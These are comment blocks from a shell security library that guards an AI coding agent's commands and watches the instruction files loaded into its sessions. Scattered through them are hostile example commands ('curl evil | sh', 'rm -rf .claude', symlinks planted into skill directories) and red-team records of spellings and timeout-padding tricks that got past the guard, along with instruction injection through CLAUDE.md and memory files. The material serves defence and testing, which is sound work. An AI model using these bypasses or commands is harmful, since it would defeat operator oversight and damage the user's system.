--expiration 0` does not arm a deletion timer, it REMOVES one — bq's own help
says "Specifying 0 removes expiration time" — so a presence test asks the
operator to confirm, and hard-denies a subagent, at the exact moment someone is
preventing future data loss. §2.11, pointed the wrong way round.

THE `=` SPELLING IS THE SAME QUESTION. absl-flags accepts `--expiration=3600`,
and a rule anchored on the bare token matched neither the value nor the flag.
The name is split off here so one ERE serves both spellings.

BOTH DIRECTIONS OF USE NOW EXIST, and they fail opposite ways — read this
before adding a third caller.
  • guard-cloud EXEMPTS with it: "the flag is present AND its value is not the
    clearing one". An unrecognised or expanded value (`--expiration $SECS`)
    yields no match, the exemption is withheld, and the command stays
    destructive-by-default. Fails SAFE.
  • guard-bash FIRES on it (harbor#196): "an output-destination flag whose
    value is a floor surface". There an unrecognised value yields no match and
    the command is ALLOWED. Fails OPEN — which is the direction every scanner
    in this file takes, and the reason B1's permissions.deny sits underneath
    needing no parser at all.

THE VALUE IS TESTED IN BOTH SPELLINGS — the raw token and its canonical path
form — so a path rule needs only the absolute form and `~/.claude`,
`$HOME/.claude` and `${HOME}/.claude` all reach it. Without that, harbor#196's
rule matched `-o /Users/me/.claude/bin/admission-bash.sh` and missed the `~/`
spelling every human actually types, which is a bypass wearing a fix's badge.

ONE awk PASS OVER THE WHOLE TABLE, NOT ONE PER SEGMENT. The first cut of the
harbor#196 caller passes `.*` as the command ERE — it is verb-agnostic by
design — so the per-segment loop this helper used to run forked a sed and an
awk for EVERY segment. P12-perf-04 caught it immediately: its 2000-segment
payload went from 0.26s to 5s, past the 3s bound, and a PreToolUse hook that
exceeds its timeout is SKIPPED. Latency here is not a comfort issue, it is a
fail-open bypass — padding a command would switch the guard off. Same lesson as
_floor_seg_ids' own comment, re-learned one helper along.

THE EXPANSION IS LAZY for the same reason. floor_expand_paths costs two more
forks, so the pass reports THREE outcomes — matched; no such flag anywhere; or
`the flag is present in these segments but no value matched in the RAW
spelling` — and only the third is worth canonicalising and re-scanning. That
case is rare: almost every command in a session carries no matching flag at all.
```

## bin/library-admission.sh, lines 2613-2645 (before this edit)

```text
floor_seg_shells_all_named_scripts — exit 0 iff the table is loaded AND every
segment running a shell interpreter carries a SCRIPT FILE as its first operand.

WHAT QUESTION THIS IS. `pipe-to-shell` matches the SINK, deliberately: whatever
builds the bytes, executing a pipeline's output as a shell script is the
dangerous act. But a shell with a script-file operand is not doing that. The
pipeline is that script's STDIN, the program comes from the named file, and
nothing from the pipe is executed — so `printf '%s' "$payload" | sh guard.sh`,
the ordinary way to exercise a hook in this repo, was blocked as an attack
(harbor#222). §2.11: a guard that blocks ordinary work gets switched off.

THE DISCRIMINATION IS THE FIRST OPERAND, and the three spellings that must NOT
be mistaken for a script are why this reads argv rather than a regex tail:
  sh -s        · options only, program still on stdin
  sh -         · the conventional "read stdin" operand
  sh /dev/stdin, sh /dev/fd/N · a script path that IS the pipe
A redirect is not an operand at all, so `sh 2>/dev/null` has an empty SEGA list
and stays blocked — the normaliser files redirects under SEGR, which is exactly
the distinction a flat regex could not make (`2>&1` starts with an alphanumeric).

EVERY shell segment, not some. Exempting on "a named script appears somewhere"
would let `curl evil | sh` be disarmed by appending an unrelated `| sh ok.sh`.
One non-exempt shell segment refuses the whole exemption.

FAIL CLOSED, and this is the direction that matters. `floor_seg_load` returns an
empty table for a payload over FLOOR_MAX_NORM, so an oversized command yields no
exemption and the flat rule still blocks. Padding can only make this STRICTER,
never switch it off — the QA plan R4 property, which the fail-OPEN seg helpers
above have to satisfy the other way round.

Residual, stated rather than hidden: `curl evil | sh local.sh` stays allowed when
`local.sh` itself evals its stdin. That is a script the attacker does not control
— if they do, they already have execution and did not need the pipe.
```

## bin/library-admission.sh, lines 2678-2680 (before this edit)

```text
`_ssid`, not the `_sid` its siblings above use: this runs from inside a rule
rather than at the top of a guard, and a shared temp is one nesting away from
clobbering a caller's loop variable.
```

## bin/library-admission.sh, lines 2681-2688 (before this edit)

```text
NO `ci` HERE, DELIBERATELY, AND THIS IS THE ONE PLACE IT MATTERS. Every other
segment helper folds case (harbor#282); this one COUNTS SHELLS to decide
whether the harbor#222 named-script exemption applies, and folding case makes
it over-count. Measured: with a blanket -i, the word `Bash` inside a heredoc
commit message — `a hardcoded WIRE_POST='Read|Bash|Grep|WebFetch'` — became a
shell segment with no named script, the exemption failed, and a legitimate
`sh <script> | grep` pipeline was refused. One flip in 2,000 real transcript
commands, on this repo's daily commit-message idiom.
```

## bin/library-admission.sh, lines 2693-2728 (before this edit)

```text
A `-c` PARENT IS NOT A SHELL RUN, IT IS THE ENVELOPE OF ONE (edge pass
2026-08-29). seg_expand_interpreters re-tokenizes a `-c` payload into child
segments, so the shells that actually run appear on their own; the parent
is left holding the flag. Counting it disqualified the exemption for
`sh -c 'printf x | sh <named script>'` — piping a payload into a named hook
script, which is how every hook in this repo is tested, and which is
ALLOWED the moment the `sh -c` wrapper is removed. It blocked three tool
calls in the pass that found it.

SKIPPING IT CANNOT OPEN THE DANGEROUS CASE, because the children answer for
themselves: `sh -c 'curl … | sh'` expands to a `curl` segment and a bare
`sh` segment with NO operand, and the `[ -n "$_ssarg" ]` arm below still
refuses that one. Nor can it open the un-expanded case: if expansion did
not happen there are no children, `_ssany` stays 0, and the tail of this
function already treats "no shell segment I could check" as no exemption.
Only `-c` and its bundled spellings are skipped — `sh -s -- x` reads a
script from stdin, is not expanded, and must keep disqualifying.
`-c` IS SPELLED OUT SEPARATELY because this is a `case` GLOB, not an ERE:
`[a-zA-Z]` matches exactly one character, so `-[a-zA-Z]*c` requires a letter
BEFORE the c and matches `-lc` while missing the bare `-c` — the commonest
spelling of the three. Measured: `-lc` was exempt and `-c` was not, from one
pattern meant to cover both.

…AND A `-c` SHELL IS ITSELF A PROGRAMMED RUN, which is the second half
(inst-quiet-predicates). It takes its program from the code ARGUMENT, so the
pipe is only that program's stdin: `… | xargs -I{} sh -c 'gh run view {}'`
executes nothing from the pipe as script, yet with no other shell segment
`_ssany` stayed 0 and it blocked. So a `-c` shell now counts as exempt —
unless its code turns stdin back into code: no code, a code argument that
IS a substitution (`sh -c "$(cat)"` expands it in the piped process), an
`eval`/`source`/`.` anywhere in the command, or a stdin path in the code.
Child shells still answer for themselves in this loop — so an UN-expanded
parent (no SEGI child next, as under `env A=1 sudo bash -c`) is not counted.
NOT when xargs splices the pipe INTO the code: `curl … | xargs -I{} sh -c '{}'`
executes piped text, so code holding any xargs replace-string refuses. The
placeholder as an ARGUMENT (`sh -c 'gh run view "$0"' {}`) stays exempt.
```

## bin/library-admission.sh, lines 2824-2839 (before this edit)

```text
floor_seg_interps_all_programmed — exit 0 iff the table is loaded AND every
segment running a non-shell interpreter (python, perl, ruby, node, php, lua,
osascript) brings its own program: a script operand or a code/module flag
(harbor#1313). Sibling of floor_seg_shells_all_named_scripts for the
interpreters that, run bare or with `-`, execute what arrives on the pipe.

AN ARGV WALK, IN ORDER, because the first decisive word wins: `python - x.py` is
a stdin program and `python x.py -` is a script. A stdin path or `-` is the
sink; a code flag (-c/-m python, -e/-E perl, -e ruby/lua/osascript, -e/-p node,
-r/-f php, glued or bundled) or a non-dash word is a program of its own. Options
alone decide nothing, so `perl -w` and `python -u` stay sinks. Residual, stated:
an option VALUE reads as a script word (`python -W ignore`), which exempts a
pipe that really is a stdin program.

EVERY interpreter segment, and fail closed as above: no table, or an oversized
payload that yields none, means no exemption and the flat rule blocks.
```

## bin/library-admission.sh, lines 2868-2898 (before this edit)

```text
floor_seg_cwd_under <dir> [<dir> …] — exit 0 iff FOLDING this command's
cd/pushd chain lands the working directory AT or BELOW one of <dir>.

THE STICKY-CD TRIGGER ARMED ON ONE HOP ONLY (pass 13, P13-fs-01, measured at
exit 0 against the live floor). It asked "does some `cd` carry the config dir
IN ITS OWN ARGUMENT", through a `[^;&|]*` that cannot cross a separator — so
the directory had to be spelled by ONE cd, in ONE word:
    cd ~ && cd .claude && echo {} > settings.json     rc=0
    cd ~; cd .claude; echo {} > settings.json         rc=0
    pushd ~ && cd .claude && echo {} > settings.json  rc=0   (`pushd` unlisted)
all of which reach the same settings.json as the one spelling that blocked.

Appending `pushd` and a second hop answers the three spellings somebody tried,
not the question. The question is WHERE THE COMMAND IS STANDING when the
mutating segment runs, and the segment table already carries what settles it:
an ORDERED list of command words with their operands. So fold them — the
arithmetic the shell itself does — and compare PATHS BY COMPONENT instead of
matching a spelling. Hops, order, `./` and `../` then cost nothing.

Component comparison is also what keeps `cd ~/.claude-notes` OUT. A directory
whose name merely begins with the config dir's is not below it, and that is
now true by construction rather than by a boundary character class every new
rule has to remember to copy — the omission that shipped a false positive in
red-team pass 6.

UNKNOWN IS NOT "INSIDE". A hook is never told the real working directory, so
the fold starts blind and goes blind again at anything it cannot resolve: a
`cd -`, a substitution, a glob, a relative hop with no anchor before it. That
is the fail-open direction every scanner in this file takes, and the caller
keeps its flat trigger alongside for the oversized payload where there is no
table to fold at all.
```

## bin/library-admission.sh, lines 2902-2905 (before this edit)

```text
No `cd`/`pushd` anywhere ⇒ nothing to fold. A `case` on a variable is a
builtin and the awk below is a fork: pass 12 measured that a PreToolUse hook
which exceeds its timeout is SKIPPED, so latency here is a fail-open bypass,
not a comfort issue.
```

## bin/library-admission.sh, lines 2978-2982 (before this edit)

```text
STICKY: once the command has stood in the config dir, every later
segment is judged as if it still does. Stepping back out with `cd ..`
is not evidence of innocence — the mutating segment may be the one in
between, and that is the shape the one-hop trigger already treated
this way.
```

## bin/library-admission.sh, lines 2989-3016 (before this edit)

```text
floor_seg_operand_under <verb-ERE> <dir> [<dir> …] — exit 0 iff, after folding
the same cd/pushd chain, some segment whose command matches <verb-ERE> carries
an OPERAND that resolves to at-or-below one of <dir>.

THE SIBLING QUESTION, AND THE ONE THE CD-BRIDGE ACTUALLY ASKS (edge pass
2026-08-29). floor_seg_cwd_under asks "is the command STANDING in the config
dir"; every spelling that matters here asks "is it standing NEXT TO it and
reaching in by a relative name". Measured against the installed guard, all of
    cd ~ && rm -rf .claude        cd ~; rm -rf .claude
    pushd ~ && rm -rf .claude     (cd ~ && rm -rf .claude)
    cd ~ && rm -rf .cl*aude       — via any later hop
exited 0 while 'rm -rf ~/.claude' blocked: the operand was relative, so no
path rule could see a config dir in it, and the cwd was ~ rather than ~/.claude,
so the fold said "outside". docs/explanation/admission-baseline.md records this class as P12-argv-01, rated
critical and left unpatched; the fold it needed did not exist when it was
written, and it does now.

THE ANCHOR IS REQUIRED, WHICH IS WHAT KEEPS THIS OFF ORDINARY WORK. `cwd`
starts EMPTY, and resolve() returns empty for a relative operand with no
anchor before it — so a bare 'rm -rf .claude' typed in some unknown directory
is untouched, exactly as it is today. Only a cd/pushd that names a directory
lexically arms this, and only for operands under it. `cd ~ && rm -rf .cache`
stays allowed because `.cache` is not the config dir, by component comparison
rather than by a character class.

UNKNOWN IS STILL NOT "INSIDE": a substitution, a glob or a variable in either
the cd target or the operand resolves to empty and matches nothing. That is the
same fail-open direction as its sibling, and the flat rules stay alongside.
```

## bin/library-admission.sh, lines 3018-3024 (before this edit)

```text
--dest-only JUDGES THE LAST OPERAND AND NOTHING ELSE, which is what makes this
usable for `cp`. docs/explanation/admission-baseline.md records three false positives (P12-argv-fp-01/02/03)
from rules that matched a config-dir operand without asking which SIDE of the
copy it was on: `cp <cfg>/x /tmp/backup` is a READ and must stay allowed, while
`cp /tmp/evil <cfg>/settings.json` is the write that matters. One flag rather
than a sibling function, because a second copy of the cd-chain fold is two
spellings of one rule and that is the drift docs/explanation/modularity.md is about.
```

## bin/library-admission.sh, lines 3058-3082 (before this edit)

```text
A LEADING `=` MEANS EXACT, ANYTHING ELSE MEANS AT-OR-BELOW, and the
difference is the whole false-positive story. The first cut matched the
config dir as a SUBTREE, which made `cd ~/.claude/MEMORY && rm
stale-note.md` a blocked command — deleting one stale note. The suite
caught it as S7, an assertion that has guarded that exact shape since pass
7. The config dir is deliberately WRITABLE (B8: "they stay writable by
design"); what is protected is the dir ITSELF and its teeth, so the dir is
passed exact and bin/ and hooks/ are passed as subtrees.
A LEADING `%` MEANS "MATCH THIS ERE", which is how a PINNED FILE inside a
writable directory is named without matching the directory (docs/explanation/admission-baseline.md
EDGE-cdbridge-01, reproduced 2026-08-30: `cd ~ && rm .claude/settings.json`
exited 0). This is the fix the record itself prescribes, and the reason the
obvious alternative is wrong: widening the config dir to a subtree closes
this too and costs `cd ~/.claude/MEMORY && rm stale-note.md`, which S7 has
asserted since pass 7. Surface regex, not subtree.

NO APOSTROPHES BELOW THIS LINE, and none above it either. The whole awk
program is one single-quoted shell word, so one apostrophe in a comment
ends it early and the file stops parsing as shell — harbor#299 is the same
defect in the statusline jq program, and writing this comment reproduced
it. `sh -n` catches it; nothing else does.

The pattern arrives on an INPUT LINE, so awk does no escape processing on
it and a `\.` in the surface list stays a literal dot — the same reason
VERB and the directories are passed this way rather than through -v.
```

## bin/library-admission.sh, lines 3321-3358 (before this edit)

```text
─────────────────────────────────────────────────────────────────────────────
B8 (harbor#38) — the PERSISTENT INSTRUCTION surfaces.
~/.claude/CLAUDE.md and the agents/skills/commands trees are loaded into every
FUTURE session. Writing to them is capability injection with a session's
delay, and all four were unwatched: guard-selfedit protects only the floor's
own teeth, and B6 hashed settings.json, not these.

They stay WRITABLE by design (upstream's "you may edit ~/.claude freely"
stance, which the owner kept). What changes is that a change is no longer
SILENT: it is pinned here and reported at the next SessionStart — which is
exactly when injected instructions would first be loaded.
NOT settable from the environment. `FLOOR_INSTR_SURFACES=' '` made the whole
check a silent no-op, which is the same undocumented-kill-switch class as
FLOOR_AWK/FLOOR_GREP (privsec FO-03/04/05, re-found as B8-04). A project-level
settings.json `env` block can set variables, so an overridable watch list is
an off switch the operator never agreed to.
`hooks` and `plugins` are here as well as under B2/B6: plugins ship hooks and
skills, and both are loaded, not merely read.

`projects/*/memory` is the auto-memory injected into every session — the
highest-value injection target in the tree. It was pulled from this list once,
on the assumption that the model rewrites it often enough to make the advisory
constant noise; the assumption was MEASURED AND WRONG (red-team B8-NOISE-06,
refuted): across 16 session transcripts, 3 (19%) touched the memory dir, and
MEMORY.md went untouched through a full day of heavy sessions. A standing
advisory until re-pin is the same posture every other surface here has, and
each memory write is exactly the model-authored, loaded-into-every-session
content this check exists to surface.

`inject.d` (harbor#173) IS AN INSTRUCTION SURFACE AND WAS ALMOST SHIPPED
UNWATCHED. A rule pack is a markdown file whose body is injected verbatim into
a session's context at the moment of a tool call — text loaded into every
FUTURE session that nothing else here reports. It is arguably the sharpest
surface on the list: a pack arrives at the instant of an action rather than in
a prefix a reader may skim, which is measurably why it works (docs/reports/evals.md E6, E10)
and exactly why an unreviewed edit to one matters MORE than an unreviewed edit
to CLAUDE.md. Caught by checking, on the same branch that built it.
`context-rules` is the same surface after harbor#1010; inject.d stays while the engine reads it.
```

## bin/library-admission.sh, lines 3364-3383 (before this edit)

```text
floor_pluginmeta_sha <json-file> — hash a TIMESTAMP-STRIPPED canonical form of a
plugin manifest (harbor#198). The plugin system rewrites `lastUpdated` /
`installedAt` in installed_plugins.json and known_marketplaces.json on every
session, so hashing raw bytes made B8 report the same paths as drift at EVERY
SessionStart and re-pinning could never stick — §2.11 in its literal form. The
canonical form keeps the plugin set, every gitCommitSha and every installPath,
so an added or repointed plugin is STILL drift; only the clock is ignored.
jq missing OR the file not parsing as JSON → hash the RAW bytes, so a manifest
we cannot normalize is still WATCHED (fail toward more coverage, never less).

`|| true` INSIDE THE SUBSTITUTION, AND IT IS LOAD-BEARING. The pinner runs under
`set -eu` (pin-instructions.sh:31), and an assignment whose command substitution
exits non-zero aborts the subshell the substitution runs in — so on a manifest jq
CANNOT PARSE, the whole function evaporated and `printf '%s  %s'` emitted a line
with an EMPTY hash and the path intact. That is worse than the churn it was built
to fix and the exact inversion of the sentence above: the file looked watched, its
hash was the empty string every time, and any subsequent edit to it was invisible
forever. Found 2026-08-18 by the malformed-catalog case in floor-test §9h, which
was written for the sibling function below and failed here first. The fallback was
always the DESIGN; under `set -e` it was unreachable code.
```

## bin/library-admission.sh, lines 3403-3439 (before this edit)

```text
floor_marketplace_sha <json-file> — hash a marketplace CATALOG with the per-entry
`source.sha` stripped. Same failure as harbor#198, different file and a field that
is not a clock, so it needs its own justification rather than an extra `del()` in
the function above.

MEASURED 2026-08-18 against anthropics/claude-plugins-official, the marketplace
this box actually tracks: 17 commits touched `.claude-plugin/marketplace.json` on
2026-08-18 alone, 13 on 2026-08-17, and a 100-commit page for that single path did
not reach its end. EVERY ONE is `bump(<plugin>): <oldsha> → <newsha>`, and the diff
is ONE line — `.plugins[].source.sha`. So the raw bytes of this file change several
times a day, B8 goes red several times a day, and the operator is invited to bless
a 286-entry vendor catalog they cannot diff (the marketplace is not a git checkout
locally, so there is no previous copy to compare against). That is §2.11 arriving
on a schedule Anthropic controls: measured on this box 2026-08-18, the pin went red
66 seconds after a clean `pin-instructions --apply`.

WHY THIS IS NOT A WEAKENED GATE — the argument has to be that the stripped field
cannot carry an instruction into a session, not merely that it is noisy:
  · `url`, `path` and `ref` STAY hashed. Repointing an entry at an attacker's repo
    is the actual supply-chain attack, and it still reads as drift (validated: a
    one-entry url change moves this hash; a sha bump does not).
  · Everything INSTALLED keeps its own pinned sha. installed_plugins.json carries
    `gitCommitSha` per installed plugin and floor_pluginmeta_sha deliberately
    preserves it — 4 entries on this box, verified 2026-08-18.
  · A catalog sha is a FORECAST, not a load. When that sha is actually fetched the
    plugin's own files land under `plugins/` and are hashed file-by-file, so the
    content change is caught at the moment it can reach a session — which is later
    than the catalog edit and strictly more informative than it.
233 of 286 entries carry an object `source`; the other 53 are plain strings and are
untouched by the projection. Every marketplace.json is RE-EMITTED below rather than
dropped, so the file stays in the manifest and an entry added, removed or repointed
is still drift — only the upstream sha treadmill is ignored.
jq missing OR the file not parsing as JSON → hash the RAW bytes, so a catalog we
cannot normalize is still WATCHED (fail toward more coverage, never less). The
`|| true` is what makes that reachable under the pinner's `set -eu` — see the note
on floor_pluginmeta_sha above, where the same one-token omission had been silently
emitting an empty hash for any manifest jq could not parse.
```

## bin/library-admission.sh, lines 3471-3482 (before this edit)

```text
── what a marketplace holds that nothing can load (harbor#1390) ────────────
A marketplace checkout carries every plugin it lists, and the harness loads only the ones a settings file enables
or installed_plugins.json installs, from their installPath (walked above by content). An upstream edit to a plugin
nobody enabled turned B8 amber at every SessionStart, and so did the plugin directory's own catalog cache, whose
listings are plugins that are not installed. Neither can carry an instruction into a session, so:
  D <prefix>      plugins/marketplaces/<mp>/<plugins|external_plugins>/<dir>/ of a plugin no name below can load
  R <path> <sha>  plugins/plugin-directory-cache-v2.json hashed over the listings of loadable plugins only, clock-free
The names: every installed_plugins.json key (any scope) and every enabledPlugins key not set to false, in this
config dir's settings.json and settings.local.json, compared without the @<marketplace>. A dir is kept when its
name is one of them or a kept catalog entry's string source points in or under it. FAIL TOWARD COVERAGE: no jq,
an installed_plugins.json the loaded walk cannot read exactly, a settings file or a catalog that does not parse,
or a name with a tab, newline or backslash, and nothing is dropped.
```

## bin/library-admission.sh, lines 3578-3592 (before this edit)

```text
floor_instr_manifest <config-dir> — "<sha>  <relative-path>" per file, sorted.
ONE implementation, shared by the pinner and the gate: two hashers that agree
only by coincidence would report drift on every session or on none.

`-exec … +` batches the hashing. Hashing 597 skill files one spawn at a time
measured 9.4s; batched it is 0.14s (2026-07-25). A SessionStart hook that
takes nine seconds is a hook the operator disables, so the batching is a
correctness property, not a micro-optimisation.
SYMLINKS ARE THE WHOLE GAME HERE. A plain `find -type f` walk does not match a
symlink at all, so `ln -s /tmp/evil.md skills/evil.md` was invisible, and a
top-level `CLAUDE.md` symlinked into a dotfiles repo — an extremely common
setup — recorded as "absent", blinding the check permanently (red-team B8-02,
B8-03). Two things are therefore recorded for every tree: the CONTENT reached
by following links (`find -L`), and the LINK TARGETS themselves, so that
re-pointing a link is drift even when the new target is byte-identical.
```

## bin/library-admission.sh, lines 3630-3671 (before this edit)

```text
DO NOT follow directory symlinks. `find -L` did, and a link pointing at
its own ancestor (`ln -s .. skills/up`) made the walk self-referential:
the manifest never settled, so the advisory became permanent and
--apply could never clear it (pass 10, B8R2-06). Enumerating without
-L terminates; a symlinked FILE is still hashed through the link below,
and every link's TARGET is recorded, so re-pointing one is still drift
even though its contents are not walked.
.git is excluded: a plugin checkout rewrites objects on every fetch,
and an advisory that fires on every fetch is one nobody reads.

`.in_use/` AND `.last_inuse_sweep` ARE THE SAME CLASS, and they were
making the advisory permanent. Claude Code reference-counts each cached
plugin by dropping `plugins/cache/<mp>/<plugin>/<ver>/.in_use/<pid>` at
session start and sweeping them into `plugins/.last_inuse_sweep`. So
EVERY session changed the manifest, and this machine's SessionStart had
been reporting the identical five paths as instruction-surface drift —
four `.in_use/<pid>` files and the sweep timestamp. Verified 2026-08-02:
the two pids present were exactly the two live sessions, and one marker
read {"pid":89490,"procStart":"Sun Aug  2 08:41:36 2026"} — a lockfile,
not content.

THIS NARROWS WHAT B8 WATCHES, so the justification has to be that the
pruned paths cannot carry injected instructions, not merely that they
are noisy. They cannot: a plugin is loaded from its manifest — skills/,
commands/, hooks/, agents/ — and nothing reads `.in_use/`. Pruning is
scoped to that one directory name and that one filename rather than to
a pattern, so a file planted anywhere else under plugins/ is still
hashed. The alternative was worse in the way №2.11 names: an advisory
that cries wolf at every single SessionStart is one the operator learns
to scroll past, and then the real drift scrolls past with it.
.gcs-sha is a git-fetch marker (one sha), pruned like .git. The two
plugin manifests are excluded here and re-emitted below in a
timestamp-normalized form (harbor#198); their raw bytes churn every
session on a lastUpdated field that carries no instruction.
marketplace.json is excluded and re-emitted the same way, on the same
reasoning applied to a different field — see floor_marketplace_sha for the
measured churn rate and why stripping `source.sha` does not narrow what a
session can be instructed by. EXCLUDED-THEN-RE-EMITTED, never dropped.
harbor#764: the plugin sync's `synced/<id>/.last-complete-round` and the cache's
`<ver>/.orphaned_at` are timestamps the harness rewrites on its own, so B8 went amber
seconds after every re-pin. Pruned by NAME and on the plugins surface only; on any other
surface the two names below are the already-pruned sweep file, a no-op.
```

## bin/library-admission.sh, lines 3697-3701 (before this edit)

```text
Prefix-stripped with awk's index(), NOT sed: the config dir is data,
and putting it in a sed PATTERN made its metacharacters active — a `|`
in the path threw "bad flag in substitute command" and silently
dropped the whole surface from the manifest, which then reads as
"clean" (red-team B8, B8-DEF-07). index() is a literal search.
```

## bin/library-admission.sh, lines 3727-3733 (before this edit)

```text
Re-emit every marketplace CATALOG in sha-normalized form. A find rather
than the fixed path the loop above uses: catalogs live one per marketplace
at plugins/marketplaces/<mp>/.claude-plugin/marketplace.json, so there are
N of them and none sits at the surface root. printf is the last command in
the body deliberately — a false test in that position kills the pipeline
under `set -eu` and SILENTLY TRUNCATES the manifest, which is the B8-02
mechanism the symlink loop below documents at length.
```

## bin/library-admission.sh, lines 3749-3761 (before this edit)

```text
A symlink to a regular FILE is hashed through the link, so swapping
its target content is drift (that was B8-02). A symlink to a
DIRECTORY is recorded by target only — see the note above.

`if`, NOT `[ … ] && …`. As the LAST command of this while body, a
false test made the loop exit 1, which killed the enclosing pipeline
under `set -eu` and SILENTLY TRUNCATED the manifest at the first
surface containing a broken or directory symlink. Weaponised in pass
11 (B8-02, critical): one `ln -s /nonexistent <cfg>/agents/x` — a
write into a surface that is writable by design — dropped skills,
commands, hooks, plugins and memory from BOTH the pin and the live
manifest, so the diff was empty forever and floor-verify reported
"✓ instruction surfaces pinned and unchanged" over live injections.
```

## bin/library-admission.sh, lines 3809-3827 (before this edit)

```text
── the work-log record writer (G2 + harbor#6) ──────────────────────────────
ONE implementation, because there are now two callers: worklog-push.sh writes
a record when a session STOPS, and memory-harvest.sh writes one when it finds a
session that stopped without ever reaching that hook — a crash, a kill, a
machine that slept. Two open-coded writers of one format drift, and the drift
is invisible: both keep producing files, they just stop being the same shape,
and the corpus that is supposed to be uniform quietly is not.

CREATE-IF-ABSENT, THEN APPEND. The Stop hook fires more than once per session,
and each firing is a real event worth a line. Idempotency for the reconciler is
therefore the RECONCILER's job — it checks the record exists before calling —
rather than a mode flag here, so this function has one behaviour instead of two.

  floor_worklog_record <log-dir> <host> <session-id> <date> <time> <cwd> [source]

`source` lands in the frontmatter, not in the line. A backfilled record is
genuinely different from a live one — its clock is the transcript's mtime, not
the moment work happened — and a reader deserves to know which they are looking
at. Keeping it out of the line means the body stays uniform for retrieval.
```

## bin/library-admission.sh, lines 3847-3878 (before this edit)

```text
─────────────────────────────────────────────────────────────────────────────
THE GITLEAKS SUBCOMMAND IS A DIALECT, AND ITS ABSENCE LOOKS LIKE A FINDING.

gitleaks 8.19 introduced `gitleaks git` and folded --pre-commit/--staged into
it. 8.18.4 has NO `git` subcommand — its verbs are detect, protect, version,
completion, help — and an unknown command exits 1. Every caller here runs the
scanner with `--exit-code 1`, i.e. "1 means a leak was found", so on 8.18.4 the
two outcomes are INDISTINGUISHABLE: a missing subcommand reads as a secret.

That is not hypothetical and it is not a corner. `.github/workflows/
governance.yml` installs v8.18.4 by exact URL and its preflight checks
`command -v gitleaks` — presence, not surface — so on a hosted runner the
work-log gate refused every commit while reporting a finding, and floor-test's
C1a teeth arm went red saying "the allowlist committed NOTHING". Measured
2026-09-06 against 8.18.4.

PROBE, NEVER ASSUME, and never pin a version here: the operator's box may carry
either, and this must not decide for them. `--help` on the subcommand is the
cheapest true answer — it exits 0 where the verb exists and non-zero where it
does not.

THE FALLBACK REALLY SCANS, and that was measured as a matched PAIR rather than
asserted, because an allow-only result is indistinguishable from a scanner that
does nothing: `protect --staged` on a planted synthetic token exits 1, and on a
clean staged tree exits 0. `detect` likewise catches a planted token in a tree.
8.18's `protect --staged` IS its documented pre-commit path, which is what
8.19's `git --pre-commit --staged` renamed.

FAIL-CLOSED IS THE CALLER'S JOB, not this function's. Both helpers return the
scanner's own verdict — 0 clean, non-zero otherwise — and every caller already
treats non-zero as "block". A helper that swallowed a scan failure would be the
fail-open shape the floor exists to refuse.
```
